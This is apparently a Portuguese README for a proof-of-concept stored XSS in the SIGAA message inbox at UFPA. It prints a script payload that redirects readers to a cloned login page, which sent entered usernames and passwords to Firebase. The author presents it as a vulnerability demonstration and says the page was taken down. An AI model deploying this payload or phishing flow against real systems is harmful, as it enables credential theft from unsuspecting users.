# Teste de redirecionamento de página na caixa postal do SIGAA

O teste é feito fazendo login no sigaa.ufpa.br e enviando uma mensagem para um usuário qualquer. No corpo da mensagem, utiliza-se o campo "HTML" e é inserido o seguinte texto:

```html
<p>URGENTE - TEM UM BUG NO SISTEMA</p>
<script>
window.location="https://giordanna.github.io/sigaa-teste/"
</script>
```

Quando o usuário clicar na mensagem, será redirecionado para a página similar ao login do SIGAA. Ao digitar as credenciais, o usuário e senha são enviados para o Firebase e o usuário é redirecionado novamente para a caixa de email.

## Atenção
A página do Github Pages deste repositório foi desativada e a entrada no banco de dados do Firebase. Foi apenas para demonstrar problemas de vulnerabilidade no SIGAA quando se permite que o usuário entre qualquer script no corpo da mensagem sem sanitizar o conteúdo. Redirecionamento para uma página de phishing é só apenas um dos possíveis problemas que isso pode ocorrer.
